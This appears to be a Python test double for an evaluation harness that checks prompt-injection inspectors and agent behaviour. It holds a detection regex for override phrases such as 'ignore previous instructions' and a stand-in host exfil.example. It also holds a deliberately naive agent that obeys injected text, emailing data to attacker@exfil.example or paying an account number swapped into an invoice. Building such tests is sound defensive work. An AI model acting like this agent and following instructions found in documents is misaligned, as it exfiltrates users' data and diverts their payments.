"""Deterministic model double for evaluation-harness tests. Test-only.

It exercises plumbing and scoring, not detection quality: inspectors flag a few
obvious keywords, the behavior tester extracts invoice fields by regex, and the
naive agent obeys any instruction it sees (so it is easy to compromise).
"""

import json
import re

SUSPICIOUS = re.compile(r"(?i)ignore (all )?(previous|your) instructions|system:|forward .* to|exfil\.example")
CANARY = re.compile(r"\b([A-Z]+-\d{4})\b")


class EvalDouble:
    def generate(self, config, *, system, user, max_output_tokens, timeout):
        request = json.loads(user)
        if "document" in request:  # the naive agent
            return self._reply(self._naive(request))
        documents = request["documents"]
        checked = [{k: v[k] for k in ("resource_id", "view_id", "view_hash")} for v in documents]
        result = {"checked_views": checked, "findings": []}
        is_behavior = bool(request["tools"])
        is_instruction = "instruction overrides" in system
        if not is_behavior:
            for view in documents:
                match = SUSPICIOUS.search(view["text"])
                if match:
                    result["findings"].append({
                        "category": "OVERRIDE_ATTEMPT" if is_instruction else "DISCLOSURE_REQUEST",
                        "source_references": [{**{k: view[k] for k in checked[0]}, "span": [match.start(), match.end()]}]})
                    break
            return self._reply(result)
        policy = request["task_policy"]["policy_id"]
        if policy == "extract_invoice":
            output = {}
            patterns = {"invoice_id": r"Invoice ID: (\S+)", "amount": r"Amount due: ([0-9.]+)",
                        "currency": r"Currency: ([A-Z]{3})", "due_date": r"Due date: (\d{4}-\d{2}-\d{2})"}
            for name, pattern in patterns.items():
                for view in documents:
                    match = re.search(pattern, view["text"])
                    if match:
                        output[name] = {"value": match.group(1),
                                        "source_references": [{**{k: view[k] for k in checked[0]}, "quote": None, "span": None}]}
                        output[name]["source_references"] = [{k: view[k] for k in ("resource_id", "view_id", "view_hash")} | {"span": [match.start(1), match.end(1)]}]
                        break
            result["task_output"] = output
        else:
            view = next(v for v in documents if v["text"].strip())
            first = view["text"].strip().splitlines()[0][:200]
            start = view["text"].index(first)
            result["task_output"] = {"statements": [{"text": first, "source_references": [
                {k: view[k] for k in ("resource_id", "view_id", "view_hash")} | {"span": [start, start + len(first)]}]}]}
        return self._reply(result)

    @staticmethod
    def _naive(request):
        text = request["document"]
        if request["task"].startswith("Pay this invoice"):  # payment-hijack agent: obeys the document
            if request["history"]:
                return {"tool_calls": [], "answer": "Paid."}
            changed = re.search(r"IBAN ([A-Z0-9 ]+?) \(", text)
            account = changed.group(1) if changed else request["vendor_master_record"]["bank_account_on_file"]
            return {"tool_calls": [{"operation": "make_payment", "arguments": {"payee": "Acme Analytics Ltd", "account": account,
                                                                               "amount": "4200.00", "currency": "USD"}}], "answer": "Paying."}
        calls = []
        if re.search(r"(?i)\b(forward|send|email)\b.*exfil\.example|make_payment|fetch_url|delete every", text):
            calls.append({"operation": "send_email", "arguments": {"to": "attacker@exfil.example", "subject": "x", "body": "x"}})
        canary = CANARY.search(text)
        answer = ("Summary. " + (canary.group(1) if canary else "")).strip()
        if "invoice" in request["task"]:
            amount = re.findall(r"(?:amount due is now|actual amount due is|report the amount due as) ([0-9.]+)", text)
            base = re.search(r"Amount due: ([0-9.]+)", text)
            answer = {"invoice_id": (re.search(r"Invoice ID: (\S+)", text) or [None, None])[1],
                      "amount": amount[0] if amount else (base.group(1) if base else None)}
        return {"tool_calls": calls, "answer": answer}

    @staticmethod
    def _reply(obj):
        return {"stop_reason": "end_turn", "text": json.dumps(obj), "usage": {"input_tokens": 10, "output_tokens": 10}}


def make():
    return EvalDouble()
